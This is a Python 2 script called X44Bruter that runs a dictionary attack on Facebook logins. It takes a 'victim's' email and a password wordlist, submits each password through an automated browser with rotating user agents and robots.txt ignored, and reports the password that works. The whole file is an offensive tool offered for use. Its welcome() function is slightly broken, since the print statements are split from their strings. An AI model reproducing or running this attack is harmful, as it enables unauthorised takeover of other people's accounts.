import sys
import mechanize
import cookielib
import random



print "+=========================================================+"
print "|======================= X44Bruter =======================|"
print "|========== Author:- Prayangshu Biswas Hritwick ==========|"
print "|===================== Version:  1.2 =====================|"
print "|======== https://github.com/x44uarbdx/x44_bruter ========|"
print "+=========================================================+"
print  "\n\n"

email = str(raw_input("Victim's Username / Email : "))

passwordlist = str(raw_input("Wordlist Path / Name : "))

login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


def main():
    global br
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    welcome()
    search()
    print("Password Does Not Exist In The Wordlist")


def brute(password):
    sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and (not 'login_attempt' in log):
        print("\n\n[+] Password Founded = {}".format(password))
        raw_input("Press Any Key To Exit")
        sys.exit(1)


def search():
    global password
    passwords = open(passwordlist, "r")
    for password in passwords:
        password = password.replace("\n", "")
        brute(password)


# welcome
def welcome():
    wel = """
        +=========================================================+
        |======================= X44Bruter =======================|
        +=========================================================+
        |========== Author:- Prayangshu Biswas Hritwick ==========|
        |===================== Version:  1.2 =====================|         
        +=========================================================+
        |======== https://github.com/x44uarbdx/x44_bruter ========|
        ++\n\n
"""
    total = open(passwordlist, "r")
    total = total.readlines()
    print
    wel
    print
    " [*] Victim's Username / Email : {}".format(email)
    print
    " [*] Password Loaded :", len(total), "passwords"
    print
    " [*] Attack Started, Please Wait ...\n\n"


if __name__ == '__main__':
    main()
